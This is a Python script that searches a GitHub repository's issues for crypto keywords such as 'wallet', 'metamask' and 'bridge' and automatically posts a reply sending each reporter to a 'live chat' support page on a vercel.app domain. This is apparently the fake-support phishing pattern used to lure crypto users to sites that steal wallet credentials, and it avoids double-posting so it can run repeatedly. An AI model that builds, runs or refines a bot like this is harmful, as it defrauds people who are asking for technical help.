import requests
import os

# GitHub token from environment
TOKEN = os.getenv("GITHUB_TOKEN")

# Repo information
OWNER = "nathanbrooks-eng"
REPO = "issue-bot-test"

# Keywords for crypto issues
CRYPTO_KEYWORDS = [
    "wallet",
    "ledger",
    "token",
    "metamask",
    "swap",
    "bridge"
]

# Auto-reply message
AUTO_REPLY = """
For quick review and assistance, contact the hub agent on the live chat page to report your issue via the [Live chat page](https://securechain-dapps.vercel.app/) to ensure total review with the technical support.

Team 🚀
"""

# Headers for GitHub API
headers = {
    "Authorization": f"token {TOKEN}",
    "Accept": "application/vnd.github+json"
}

# Build URL to get issues
url = f"https://api.github.com/repos/{OWNER}/{REPO}/issues"

# Make request
response = requests.get(url, headers=headers)

# Check if request worked
if response.status_code != 200:
    print("Error:", response.status_code, response.text)
    exit()

# 4️⃣ NOW parse JSON
issues = response.json()

# 5️⃣ loop issues
for issue in issues:
    title = (issue["title"] or "").lower()
    body = (issue["body"] or "").lower()
    
    # NEW DUPLICATE CHECK + REPLY
    if any(k in title or k in body for k in CRYPTO_KEYWORDS):
        issue_number = issue["number"]
        comments_url = f"https://api.github.com/repos/{OWNER}/{REPO}/issues/{issue_number}/comments"

        # Get existing comments
        comments = requests.get(comments_url, headers=headers).json()

        # Prevent duplicate replies
        already_replied = any(c["user"]["type"] == "Bot" for c in comments)

        if already_replied:
            print(f"Already replied to issue #{issue_number}, skipping.")
            continue  # skip this issue

        # Post reply
        requests.post(comments_url, headers=headers, json={"body": AUTO_REPLY})
        print(f"Replied to issue #{issue_number}")